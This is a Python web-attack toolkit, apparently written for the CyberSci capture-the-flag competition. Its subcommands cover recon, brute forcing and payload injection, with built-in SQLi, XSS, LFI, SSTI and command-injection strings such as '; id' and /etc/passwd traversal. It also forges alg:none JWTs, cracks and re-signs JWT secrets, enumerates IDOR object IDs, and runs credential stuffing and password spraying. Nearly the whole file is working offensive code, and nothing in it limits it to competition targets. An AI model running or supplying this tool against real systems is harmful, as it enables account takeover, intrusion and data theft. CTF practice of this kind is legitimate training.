#!/usr/bin/env python3
"""
CTF WEB SECURITY SKELETON  (CyberSci)
======================================
CHEAT SHEET
-----------
Install   : pip install requests    (only hard dependency; everything else is stdlib)
Help      : python3 ctf_web.py <cmd> -h
Flag hunt : every command auto-searches response bodies/headers for --flag-regex,
            and across base64/hex/rot13/xor/url/reverse decodings of them.
            Confirm the real flag format first, then change DEFAULT_FLAG_RE below.
FUZZ      : most commands inject the literal string FUZZ wherever you want the
            payload/wordlist entry to go -- in -t (URL/query), -d (body), -c (cookie),
            or -H (a header value). Put it in exactly one place per run.

Subcommands
-----------
recon  -t http://10.0.0.5/                         headers, cookies, forms, comments,
                                                     robots.txt/.git/HEAD probes, tech fingerprint
fuzz   -t 'http://10.0.0.5/FUZZ' --wordlist common.txt --threads 30
                                                     dir/endpoint brute force, auto baseline filter
fuzz   -t 'http://10.0.0.5/?id=1' -d 'x=FUZZ' --wordlist params.txt
inject -t 'http://10.0.0.5/search?q=FUZZ' --type sqli
inject -t 'http://10.0.0.5/view?f=FUZZ' --type lfi
inject -d 'tpl=FUZZ' -X POST -t http://10.0.0.5/render --type ssti
inject -t 'http://10.0.0.5/?name=FUZZ' --type xss
jwt    -d '<token>'                                 decode header/payload (no verify)
jwt    -d '<token>' --none                          forge alg:none variants
jwt    -d '<token>' --crack --wordlist rockyou.txt   brute force the HMAC secret
jwt    -d '<token>' --secret s3cr3t --set admin=true forge a signed token with new claims
idor   -t 'http://10.0.0.5/api/user/FUZZ' --ids 1-50 --baseline 1
login  -t http://10.0.0.5/login --combo creds.txt --success-str Welcome
login  -t http://10.0.0.5/login --user admin --passlist rockyou.txt --fail-str Invalid
decode -d 'ZmxhZ3t0ZXN0fQ=='                        try common decodings (or -f file, or stdin);
                                                     auto-detects and pretty-prints JWTs

Global flags: -X method  --timeout 7  --proxy http://127.0.0.1:8080 (Burp)
              --flag-regex 'regex'  -v (debug + tracebacks)

Fallbacks when this script is too slow to adapt:
  ffuf -u URL/FUZZ -w list.txt            sqlmap -u URL --batch --dbs
  curl -s URL | grep -oE '<!--.*-->'      jwt.io  (paste token, inspect by hand)
"""

import argparse
import base64
import binascii
import codecs
import hashlib
import hmac
import json
import logging
import os
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from html.parser import HTMLParser

try:
    import requests
except ImportError:
    requests = None

log = logging.getLogger("ctfweb")

# EDIT HERE: confirm the real flag format from the CyberSci rules / challenge text
DEFAULT_FLAG_RE = r"(?:CTF|FLAG|flag|CYBERSCI|cybersci)\{[^}\n]{1,200}\}"


# =========================================================================== #
# Generic helpers (shared across commands)
# =========================================================================== #
def need(mod, pip_name):
    if mod is None:
        raise SystemExit(f"[!] missing dependency -> pip install {pip_name}")


def need_target(a):
    if not a.target:
        raise SystemExit("[!] -t/--target is required for this command")
    return a.target


def normalize_url(target, port=None):
    """Add a scheme if missing; append --port if the URL has none."""
    if "://" not in target:
        target = "http://" + target
    if port:
        p = urllib.parse.urlsplit(target)
        if ":" not in p.netloc:
            target = urllib.parse.urlunsplit((p.scheme, f"{p.netloc}:{port}", p.path, p.query, p.fragment))
    return target


def need_url(a):
    return normalize_url(need_target(a), getattr(a, "port", None))


def to_bytes(x):
    return x if isinstance(x, (bytes, bytearray)) else str(x).encode("utf-8", "replace")


def fz(x, word):
    """Substitute the FUZZ marker. No-op on non-strings (e.g. None body)."""
    return x.replace("FUZZ", word) if (word and isinstance(x, str)) else x


def cookie_str_to_dict(cookie_str):
    d = {}
    for kv in (cookie_str or "").split(";"):
        if "=" in kv:
            k, v = kv.strip().split("=", 1)
            d[k] = v
    return d


def build_session(a):
    """requests.Session with default UA, custom headers, cookie jar, and optional proxy."""
    need(requests, "requests")
    s = requests.Session()
    s.verify = False
    headers = {"User-Agent": "Mozilla/5.0"}  # EDIT HERE: default UA / static auth headers
    for h in (getattr(a, "header", None) or []):
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()
    s.headers.update(headers)
    s.cookies.update(cookie_str_to_dict(getattr(a, "cookie", None)))
    if getattr(a, "proxy", None):
        s.proxies = {"http": a.proxy, "https": a.proxy}
    return s


def parse_range(spec):
    """'1-5,9,20-22' -> ['1','2','3','4','5','9','20','21','22'] (kept as strings)."""
    out = []
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            lo, hi = part.split("-", 1)
            out.extend(str(i) for i in range(int(lo), int(hi) + 1))
        elif part:
            out.append(part)
    return out


def try_decodings(blob):
    """Yield (name, decoded_bytes) for each cheap decoding that succeeds."""
    t = bytes(blob).strip()
    attempts = {
        # TODO: add custom decodings here (e.g. base85, zlib, gzip, custom alphabet)
        "base64": lambda: base64.b64decode(t + b"=" * (-len(t) % 4)),
        "base64url": lambda: base64.urlsafe_b64decode(t + b"=" * (-len(t) % 4)),
        "base32": lambda: base64.b32decode(t + b"=" * (-len(t) % 8)),
        "hex": lambda: binascii.unhexlify(re.sub(rb"[^0-9a-fA-F]", b"", t)),
        "rot13": lambda: codecs.decode(t.decode("latin-1"), "rot_13").encode("latin-1"),
        "urldecode": lambda: urllib.parse.unquote_to_bytes(t),
        "reverse": lambda: t[::-1],
    }
    for name, fn in attempts.items():
        try:
            out = fn()
            if out and out != t:
                yield name, out
                if len(out) <= 1 << 16:  # chain one level, e.g. hex-then-XOR
                    for k in range(1, 256):
                        yield f"{name}>xor_0x{k:02x}", out.translate(_XOR_TABLES[k])
        except Exception:
            continue
    if len(t) <= 1 << 20:
        for k in range(1, 256):  # single-byte XOR (translate = fast C loop)
            yield f"xor_0x{k:02x}", t.translate(_XOR_TABLES[k])


_XOR_TABLES = {k: bytes(b ^ k for b in range(256)) for k in range(1, 256)}


def hunt(data, flag_re, label=""):
    """Search data and its common decodings for the flag regex. Prints hits."""
    blob = to_bytes(data)
    if not blob:
        return
    pat = re.compile(to_bytes(flag_re))
    seen = set()
    for name, buf in [("raw", blob), *try_decodings(blob)]:
        for m in pat.finditer(buf):
            hit = (name, m.group(0))
            if hit not in seen:
                seen.add(hit)
                print(f"\033[92m[FLAG?] {label} via {name}: {m.group(0).decode(errors='replace')}\033[0m")


# =========================================================================== #
# recon
# =========================================================================== #
COOKIE_TECH = {
    "PHPSESSID": "PHP", "JSESSIONID": "Java/Tomcat", "laravel_session": "Laravel",
    "connect.sid": "Node/Express", "ASP.NET_SessionId": "ASP.NET",
    "django_sessionid": "Django", "csrftoken": "Django",
}
PROBE_PATHS = ["robots.txt", "sitemap.xml", ".git/HEAD", "server-status", ".env", "admin/"]
# TODO: EDIT HERE - add challenge-specific paths (backup.zip, api/swagger.json, ...)


class PageParser(HTMLParser):
    """Stdlib-only extraction of forms, links, comments, and a generator meta tag."""

    def __init__(self):
        super().__init__()
        self.forms, self.links, self.comments, self.meta = [], [], [], {}
        self._form = None

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "form":
            self._form = {"action": d.get("action", ""), "method": d.get("method", "GET").upper(), "inputs": []}
            self.forms.append(self._form)
        elif tag in ("input", "textarea", "select", "button") and self._form is not None:
            self._form["inputs"].append((d.get("name", ""), d.get("type", "text")))
        elif tag == "a" and d.get("href"):
            self.links.append(d["href"])
        elif tag == "meta" and d.get("name", "").lower() == "generator":
            self.meta["generator"] = d.get("content", "")

    def handle_endtag(self, tag):
        if tag == "form":
            self._form = None

    def handle_comment(self, data):
        self.comments.append(data.strip())


def cmd_recon(a):
    url = need_url(a)
    s = build_session(a)
    try:
        r = s.get(url, timeout=a.timeout, allow_redirects=True)
    except requests.RequestException as e:
        raise SystemExit(f"[!] request failed: {e}")

    print(f"[{r.status_code}] {r.url}  {len(r.content)}B")
    print("-- headers --")
    for k, v in r.headers.items():
        print(f"  {k}: {v}")
    if r.cookies:
        print("-- cookies --")
        for c in r.cookies:
            print(f"  {c.name} = {c.value}  (tech hint: {COOKIE_TECH.get(c.name, '-')})")

    pp = PageParser()
    try:
        pp.feed(r.text)
    except Exception:
        pass
    if pp.meta.get("generator"):
        print(f"[tech] generator: {pp.meta['generator']}")
    if pp.forms:
        print("-- forms --")
        for f in pp.forms:
            fields = ", ".join(f"{n}:{t}" for n, t in f["inputs"] if n)
            print(f"  {f['method']} {f['action'] or '(self)'}  [{fields}]")
    if pp.comments:
        print("-- html comments --")
        for c in pp.comments[:20]:
            print(f"  <!-- {c[:200]} -->")
    if pp.links:
        uniq = sorted(set(pp.links))[:30]
        print(f"-- links ({len(pp.links)} total, showing {len(uniq)}) --")
        for l in uniq:
            print(f"  {l}")

    print("-- quick probes --")
    for path in PROBE_PATHS:
        try:
            rr = s.get(urllib.parse.urljoin(url, "/" + path), timeout=a.timeout)
            if rr.status_code < 400 and rr.content:
                print(f"  [found] /{path}  [{rr.status_code}] {len(rr.content)}B")
                hunt(rr.content, a.flag_re, path)
        except requests.RequestException:
            pass

    hunt(r.content, a.flag_re, "body")
    hunt("\n".join(f"{k}: {v}" for k, v in r.headers.items()), a.flag_re, "headers")
    for c in pp.comments:
        hunt(c, a.flag_re, "comment")


# =========================================================================== #
# fuzz  (directory / parameter brute force)
# =========================================================================== #
def has_fuzz(a):
    return "FUZZ" in (a.target or "") or "FUZZ" in (a.data or "") or "FUZZ" in (a.cookie or "") or \
        any("FUZZ" in h for h in (a.header or []))


def cmd_fuzz(a):
    if not a.wordlist:
        raise SystemExit("[!] --wordlist is required")
    url = need_url(a)
    if not has_fuzz(a):
        raise SystemExit("[!] put FUZZ somewhere: -t/-d/-c/-H")

    s = build_session(a)
    with open(a.wordlist, errors="ignore") as f:
        words = [w.strip() for w in f if w.strip() and not w.startswith("#")]
    filter_codes = {int(x) for x in a.filter_code.split(",") if x}

    def one(word):
        try:
            return word, s.request(
                a.method, fz(url, word),
                headers={k: fz(v, word) for k, v in s.headers.items()},
                data=fz(a.data, word),
                cookies=cookie_str_to_dict(fz(a.cookie, word)) if a.cookie else None,
                timeout=a.timeout, allow_redirects=False,
            )
        except requests.RequestException as e:
            log.debug("skip %r: %s", word, e)
            return word, None

    # baseline with a random token -> auto-filters generic "not found" pages (ffuf-style)
    probe = "zz" + os.urandom(4).hex()
    _, br = one(probe)
    base_len = len(br.content) if br is not None else None
    log.info("baseline: %s %sB", getattr(br, "status_code", "?"), base_len)

    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        for word, r in ex.map(one, words):
            if r is None or r.status_code in filter_codes:
                continue
            if a.filter_size and len(r.content) == a.filter_size:
                continue
            if (br is not None and not a.show_baseline_matches and
                    r.status_code == br.status_code and len(r.content) == base_len):
                continue  # EDIT HERE: drop this skip if you suspect false negatives
            mark = " <--" if r.status_code in (200, 204, 301, 302, 401, 403) else ""
            print(f"{r.status_code:<4} {len(r.content):<8} {word}{mark}")
            hunt(r.content, a.flag_re, word)


# =========================================================================== #
# inject  (sqli / xss / lfi / ssti / cmdi probes, one engine for all of them)
# =========================================================================== #
PAYLOADS = {
    "sqli": [
        "'", "\"", "' OR '1'='1", "' OR '1'='1' -- -", "' OR '1'='1'#",
        "' OR SLEEP(5)-- -", "' OR pg_sleep(5)-- -", "'; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT NULL-- -", "' AND 1=CONVERT(int,(SELECT @@version))--",
    ],
    "xss": [
        "<script>alert(1)</script>", "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "javascript:alert(1)", "\"onmouseover=\"alert(1)",
    ],
    "lfi": [
        "../../../../etc/passwd", "....//....//....//etc/passwd",
        "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index",
        "..%2f..%2f..%2fetc%2fpasswd", "C:\\windows\\win.ini", "/proc/self/environ",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}", "@(7*7)", "*{7*7}",
    ],
    "cmdi": [
        "; id", "| id", "`id`", "$(id)", "; sleep 5", "| sleep 5", "|| id", "&& id",
    ],
}
# TODO: EDIT HERE - trim or extend the list above for the actual target;
#       or pass --custom-payloads FILE to append one payload per line.
# NOTE: when FUZZ sits in the URL (-t), a payload containing # or & can get cut off
#       by URL parsing before it reaches the server -- percent-encode it yourself
#       (%23, %26) in --custom-payloads if a payload looks like it's being truncated.

SIGNATURES = {
    "sqli": re.compile(rb"sql syntax|mysql_fetch|unclosed quotation|pg_query|"
                        rb"postgresql.{0,20}error|sqlite3::|ora-\d{5}|odbc (sql server|driver)", re.I),
    "lfi": re.compile(rb"root:.*:0:0:|\[extensions\]|\[fonts\]|for 16-bit app support", re.I),
    "cmdi": re.compile(rb"uid=\d+\([^)]*\)\s*gid=\d+", re.I),
}


def cmd_inject(a):
    url = need_url(a)
    if not has_fuzz(a):
        raise SystemExit("[!] put FUZZ at the injection point: -t/-d/-c/-H")
    s = build_session(a)

    payloads = list(PAYLOADS[a.type])
    if a.custom_payloads:
        with open(a.custom_payloads, errors="ignore") as f:
            payloads += [ln.rstrip("\n") for ln in f if ln.strip()]

    def send(val):
        t0 = time.time()
        r = s.request(
            a.method, fz(url, val),
            headers={k: fz(v, val) for k, v in s.headers.items()},
            data=fz(a.data, val),
            cookies=cookie_str_to_dict(fz(a.cookie, val)) if a.cookie else None,
            timeout=max(a.timeout, 10), allow_redirects=False,
        )
        return r, time.time() - t0

    base_r, base_t = send("baselineZZ1")
    base_len = len(base_r.content)
    log.info("baseline: %s %sB %.2fs", base_r.status_code, base_len, base_t)

    for pl in payloads:
        try:
            r, dt = send(pl)
        except requests.exceptions.Timeout:
            r, dt = None, max(a.timeout, 10)  # a hard timeout is itself a time-based hit
        except requests.RequestException as e:
            log.debug("skip %r: %s", pl, e)
            continue

        flags = []
        if dt - base_t > a.sleep_threshold:
            flags.append("SLOW")
        if r is not None:
            if r.status_code != base_r.status_code or abs(len(r.content) - base_len) > a.diff_bytes:
                flags.append("DIFF")
            sig = SIGNATURES.get(a.type)
            if sig and sig.search(r.content):
                flags.append("SIGNATURE")
            if a.type == "xss" and to_bytes(pl) in r.content:
                flags.append("REFLECTED-RAW")
            if a.type == "ssti" and b"49" in r.content and b"49" not in base_r.content:
                flags.append("EVAL?")  # NOTE: "49" can occur naturally -- eyeball the body

        status = r.status_code if r is not None else "TIMEOUT"
        length = len(r.content) if r is not None else "-"
        print(f"[{status}] {length:<7} {dt:5.2f}s  {' '.join(flags):<24} {pl[:60]}")
        if r is not None:
            hunt(r.content, a.flag_re, pl[:30])


# =========================================================================== #
# jwt  (decode / forge alg:none / brute-force secret / re-sign with new claims)
# =========================================================================== #
_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def b64url_decode(s):
    s = s.strip()
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def jwt_parts(token):
    bits = token.strip().split(".")
    if len(bits) < 2:
        raise ValueError("not a JWT (need header.payload[.sig])")
    header = json.loads(b64url_decode(bits[0]))
    payload = json.loads(b64url_decode(bits[1]))
    sig = b64url_decode(bits[2]) if len(bits) > 2 and bits[2] else b""
    return header, payload, sig, bits


def jwt_sign(header_b64, payload_b64, secret, alg):
    mac = hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(),
                    _HASH.get(alg, hashlib.sha256)).digest()
    return b64url_encode(mac)


def cmd_jwt(a):
    token = (a.data or (open(a.file).read() if a.file else "")).strip()
    if not token:
        raise SystemExit("[!] give the token via -d or -f")
    header, payload, sig, bits = jwt_parts(token)
    print("[header] ", json.dumps(header, indent=2))
    print("[payload]", json.dumps(payload, indent=2))
    hunt(json.dumps(payload), a.flag_re, "jwt-payload")

    if a.none_alg:
        # EDIT HERE: some validators only check alg case-insensitively -- try all three
        for variant in ("none", "None", "NONE"):
            h = dict(header)
            h["alg"] = variant
            hb = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            print(f"[alg={variant}] {hb}.{bits[1]}.")
        return

    if a.crack:
        if not a.wordlist:
            raise SystemExit("[!] --crack needs --wordlist")
        alg = header.get("alg", "HS256")
        with open(a.wordlist, errors="ignore") as f:
            for i, line in enumerate(f):
                secret = line.rstrip("\n")
                if secret and jwt_sign(bits[0], bits[1], secret, alg) == bits[2]:
                    print(f"[CRACKED] secret = {secret!r}")
                    return
                if a.verbose and i % 5000 == 0:
                    log.debug("tried %d...", i)
        print("[-] not found in wordlist")
        return

    if a.set or a.secret:
        h, p = dict(header), dict(payload)
        for kv in (a.set or []):  # EDIT HERE: the claims you want to tamper with
            k, v = kv.split("=", 1)
            try:
                v = json.loads(v)
            except Exception:
                pass
            p[k] = v
        hb = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        pb = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
        if a.secret:
            print(f"[forged] {hb}.{pb}.{jwt_sign(hb, pb, a.secret, h.get('alg', 'HS256'))}")
        else:
            print(f"[forged, unsigned] {hb}.{pb}.")


# =========================================================================== #
# idor
# =========================================================================== #
def cmd_idor(a):
    url = need_url(a)
    if "FUZZ" not in url and "FUZZ" not in (a.data or ""):
        raise SystemExit("[!] put FUZZ where the id/object-ref goes: -t or -d")
    if not a.ids:
        raise SystemExit("[!] --ids is required, e.g. --ids 1-50 or --ids 3,7,19")
    s = build_session(a)

    base_r = None
    if a.baseline:
        base_r = s.request(a.method, fz(url, a.baseline), data=fz(a.data, a.baseline), timeout=a.timeout)
        print(f"[baseline id={a.baseline}] {base_r.status_code} {len(base_r.content)}B")

    for i in parse_range(a.ids):
        try:
            r = s.request(a.method, fz(url, i), data=fz(a.data, i), timeout=a.timeout)
        except requests.RequestException as e:
            log.debug("skip %s: %s", i, e)
            continue
        tag = ""
        if base_r is not None and (r.status_code != base_r.status_code or len(r.content) != len(base_r.content)):
            tag = "<-- DIFF from baseline"
        print(f"id={i:<6} [{r.status_code}] {len(r.content):<7}B {tag}")
        hunt(r.content, a.flag_re, f"id={i}")
        if a.delay:
            time.sleep(a.delay)


# =========================================================================== #
# login  (credential stuffing / password spray, with optional CSRF scraping)
# =========================================================================== #
def cmd_login(a):
    url = need_url(a)
    s = build_session(a)

    def get_csrf():
        if not a.csrf_url:
            return None
        r = s.get(a.csrf_url, timeout=a.timeout)
        m = re.search(a.csrf_regex.encode(), r.content)
        return m.group(1).decode() if m else None

    if a.combo:
        with open(a.combo, errors="ignore") as f:
            pairs = [tuple(ln.strip().split(":", 1)) for ln in f if ":" in ln]
    elif a.user and a.passlist:
        with open(a.passlist, errors="ignore") as f:
            pairs = [(a.user, ln.strip()) for ln in f if ln.strip()]
    else:
        raise SystemExit("[!] use --combo FILE   or   --user NAME --passlist FILE")

    for user, pwd in pairs:
        form = {a.user_field: user, a.pass_field: pwd}
        for kv in (a.extra or []):  # EDIT HERE: extra static fields the form needs
            k, v = kv.split("=", 1)
            form[k] = v
        token = get_csrf()
        if token:
            form[a.csrf_field] = token

        try:
            r = s.post(url, data=form, timeout=a.timeout, allow_redirects=a.redirects)
        except requests.RequestException as e:
            log.debug("skip %s:%s -> %s", user, pwd, e)
            continue

        body = r.text
        if a.success_str:
            ok = a.success_str in body
        elif a.fail_str:
            ok = a.fail_str not in body
        else:
            ok = None  # TODO: EDIT HERE - no heuristic given; eyeball status/length below
        mark = "SUCCESS" if ok else ("fail" if ok is False else "?")
        print(f"{mark:<8} [{r.status_code}] {len(r.content):<7}B  {user}:{pwd}")
        hunt(r.content, a.flag_re, f"{user}:{pwd}")
        if ok and not a.no_stop:
            print(f"[+] stopping -- {user}:{pwd} looks valid. Session cookies: {dict(s.cookies)}")
            return


# =========================================================================== #
# decode
# =========================================================================== #
def cmd_decode(a):
    if a.data:
        blob = to_bytes(a.data)
    elif a.file:
        with open(a.file, "rb") as f:
            blob = f.read()
    else:
        blob = sys.stdin.buffer.read()
    blob = blob.strip()

    if blob.count(b".") >= 2:
        try:
            h, p, _, _ = jwt_parts(blob.decode())
            print("[jwt header] ", json.dumps(h))
            print("[jwt payload]", json.dumps(p))
        except Exception:
            pass

    for name, out in try_decodings(blob):
        if "xor" in name:
            continue  # too noisy to print; flag hunt below still covers it
        ratio = sum(32 <= b < 127 or b in (9, 10, 13) for b in out) / max(len(out), 1)
        if ratio > 0.9:
            print(f"[{name}] {out[:300]!r}")
    hunt(blob, a.flag_re, "decode")


# =========================================================================== #
# CLI
# =========================================================================== #
def build_parser():
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("-t", "--target", help="URL (scheme optional, e.g. 10.0.0.5/path)")
    common.add_argument("-p", "--port", help="appended to target if it has no port")
    common.add_argument("-X", "--method", default="GET")
    common.add_argument("-d", "--data", help="body/param string; put FUZZ where needed")
    common.add_argument("-H", "--header", action="append", help="'Key: Value' (repeatable, FUZZ ok)")
    common.add_argument("-c", "--cookie", help="'a=b; c=d' (FUZZ ok)")
    common.add_argument("-f", "--file", help="read token/payload from a file instead of -d")
    common.add_argument("--proxy", help="e.g. http://127.0.0.1:8080 (Burp)")
    common.add_argument("--timeout", type=float, default=7.0)
    common.add_argument("--flag-regex", dest="flag_re", default=DEFAULT_FLAG_RE)
    common.add_argument("-v", "--verbose", action="store_true", help="debug logs + tracebacks")

    ap = argparse.ArgumentParser(description="CTF web security skeleton (see file docstring)",
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("recon", parents=[common], help="headers/cookies/forms/comments/tech fingerprint") \
        .set_defaults(func=cmd_recon)

    sp = sub.add_parser("fuzz", parents=[common], help="dir/param brute force")
    sp.add_argument("--wordlist", required=True)
    sp.add_argument("--filter-code", dest="filter_code", default="", help="comma list to skip, e.g. 404,400")
    sp.add_argument("--filter-size", dest="filter_size", type=int)
    sp.add_argument("--threads", type=int, default=20)
    sp.add_argument("--show-baseline-matches", dest="show_baseline_matches", action="store_true")
    sp.set_defaults(func=cmd_fuzz)

    sp = sub.add_parser("inject", parents=[common], help="sqli/xss/lfi/ssti/cmdi payload tester")
    sp.add_argument("--type", required=True, choices=list(PAYLOADS))
    sp.add_argument("--custom-payloads", dest="custom_payloads", help="extra payloads, one per line")
    sp.add_argument("--sleep-threshold", dest="sleep_threshold", type=float, default=3.0)
    sp.add_argument("--diff-bytes", dest="diff_bytes", type=int, default=5)
    sp.set_defaults(func=cmd_inject)

    sp = sub.add_parser("jwt", parents=[common], help="decode / forge / crack a JWT")
    sp.add_argument("--none", dest="none_alg", action="store_true", help="forge alg:none variants")
    sp.add_argument("--crack", action="store_true", help="brute force the HMAC secret")
    sp.add_argument("--wordlist", help="for --crack")
    sp.add_argument("--secret", help="sign a forged token with this secret")
    sp.add_argument("--set", action="append", help="claim=value to set (repeatable)")
    sp.set_defaults(func=cmd_jwt)

    sp = sub.add_parser("idor", parents=[common], help="iterate an id/object ref, diff vs baseline")
    sp.add_argument("--ids", required=True, help="'1-50' or '3,7,19'")
    sp.add_argument("--baseline", help="id you're authorised to see, for diffing")
    sp.add_argument("--delay", type=float, default=0.0)
    sp.set_defaults(func=cmd_idor)

    sp = sub.add_parser("login", parents=[common], help="credential stuffing / password spray")
    sp.add_argument("--combo", help="'user:pass' per line")
    sp.add_argument("--user", help="single username, pair with --passlist")
    sp.add_argument("--passlist", help="password wordlist, pair with --user")
    sp.add_argument("--user-field", dest="user_field", default="username")
    sp.add_argument("--pass-field", dest="pass_field", default="password")
    sp.add_argument("--extra", action="append", help="extra static form field key=value (repeatable)")
    sp.add_argument("--csrf-url", dest="csrf_url", help="GET this first to scrape a fresh CSRF token")
    sp.add_argument("--csrf-field", dest="csrf_field", default="csrf_token")
    sp.add_argument("--csrf-regex", dest="csrf_regex", default=r'name="csrf_token"\s+value="([^"]+)"')
    sp.add_argument("--success-str", dest="success_str", help="substring present only on success")
    sp.add_argument("--fail-str", dest="fail_str", help="substring present only on failure")
    sp.add_argument("--no-stop", dest="no_stop", action="store_true", help="don't stop at first success")
    sp.add_argument("--redirects", action="store_true", help="follow redirects")
    sp.set_defaults(func=cmd_login)

    sub.add_parser("decode", parents=[common], help="try common decodings; auto-detect JWTs") \
        .set_defaults(func=cmd_decode)
    return ap


def main():
    a = build_parser().parse_args()
    logging.basicConfig(level=logging.DEBUG if a.verbose else logging.INFO,
                        format="[%(levelname).1s] %(message)s")
    need(requests, "requests")
    try:
        import urllib3
        urllib3.disable_warnings()
    except ImportError:
        pass
    try:
        a.func(a)
    except KeyboardInterrupt:
        log.warning("interrupted")
        sys.exit(130)
    except requests.exceptions.Timeout:
        log.error("timed out (raise --timeout, or this IS the time-based signal you wanted)")
    except requests.exceptions.ConnectionError as e:
        log.error("connection failed: %s", e)
    except FileNotFoundError as e:
        log.error("file not found: %s", e.filename)
    except (ValueError, json.JSONDecodeError, binascii.Error) as e:
        log.error("bad input (JWT/hex/regex/json?): %s", e)
    except Exception as e:  # last-resort net so the script never dies silently
        log.error("unexpected %s: %s", type(e).__name__, e)
        if a.verbose:
            raise


if __name__ == "__main__":
    main()
